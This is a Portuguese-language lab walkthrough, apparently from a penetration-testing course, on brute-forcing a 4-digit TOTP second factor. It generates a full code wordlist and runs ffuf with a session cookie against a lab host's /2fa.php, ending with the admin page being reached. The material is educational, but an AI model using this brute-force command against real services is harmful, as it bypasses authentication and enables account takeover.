Implementações comuns de 2FA usam **senha + TOTP** (aplicativo autenticador ou SMS). TOTPs só com dígitos e **curtos** podem ser *brute-forced* se não houver bloqueios. No lab, já temos credenciais por phishing (`admin:admin`), mas a aplicação exige 2FA:

```
http://<SERVER_IP>:<PORT>/2fa.php
"Welcome admin. Please provide your 4-digit One-Time Password (OTP)."

```

O TOTP é **4 dígitos** (10.000 combinações). A requisição de exemplo mostra:

- Método: **POST** para `/2fa.php`
    
- Parâmetro: `otp=0000`
    
- Resposta de erro: **"Invalid 2FA Code."**
    
- É necessário enviar o **cookie de sessão** `PHPSESSID` para atrelar o TOTP à sessão autenticada.
    

## Brute-forcing do TOTP

1.  Gerar a wordlist de `0000` a `9999`:

`seq -w 0 9999 > tokens.txt`

2.  Rodar o `ffuf` filtrando respostas com o erro:

```
ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" \
  -d "otp=FUZZ" -fr "Invalid 2FA Code"

```

**Saída (trecho):**

```
[Status: 302, ...] * FUZZ: 6513
[Status: 302, ...] * FUZZ: 6514
...
[Status: 302, ...] * FUZZ: 9999

```

Vários **302** aparecem porque, após acertar o TOTP (primeiro hit: **6513**), a sessão passa a estar **totalmente autenticada**, e as requisições com o mesmo cookie são redirecionadas para `/admin.php`.  
Basta acessar `/admin.php` no navegador para confirmar que o 2FA foi concluído com sucesso.